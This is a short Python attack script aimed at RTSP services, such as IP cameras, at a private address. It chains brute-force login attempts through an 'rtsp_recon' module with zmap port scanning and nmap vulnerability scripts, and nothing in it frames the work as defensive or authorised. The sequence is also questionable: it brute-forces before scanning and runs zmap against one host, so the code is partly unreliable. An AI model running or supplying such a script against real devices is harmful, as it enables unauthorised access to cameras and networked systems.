#!/usr/bin/env python

import rtsp_recon as recon
import subprocess

# Target IP address
target = "192.168.1.100"

# Create a new recon object
r = recon.Recon()

# Add a new target
r.add_target(target)

# Start the brute force attack
r.brute()

# Use zmap to scan for open RTSP ports
print("[*] Scanning for open RTSP ports...")
subprocess.run(["zmap", "-p", "554", target])

# Use nmap to scan for vulnerabilities
print("[*] Scanning for vulnerabilities...")
subprocess.run(["nmap", "-p", "1-1000", "--script", "vuln", target])

# Use rtsp-recon to perform a more thorough brute force attack
print("[*] Performing advanced brute force attack...")
r.advanced_brute()